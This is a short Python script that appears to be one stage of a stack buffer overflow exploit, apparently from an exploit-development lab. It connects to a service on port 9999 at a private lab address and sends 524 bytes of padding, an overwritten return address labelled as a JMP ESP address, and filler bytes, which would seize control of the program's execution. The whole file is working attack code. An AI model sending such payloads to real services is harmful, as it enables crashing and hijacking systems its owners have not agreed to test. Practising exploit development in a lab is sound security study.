import socket

buffer = "A"*524
buffer += "\xf3\x12\x17\x31" # JMP ESP address
buffer += "C" * (1500-len(buffer))

try:
	print("Fuzzing the input with {0} bytes".format(len(buffer)))
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.1.49',9999)) 
	s.send(buffer+'\r\n')
	s.recv(1024)
	s.close()
except:
	print("Exploit failed!")
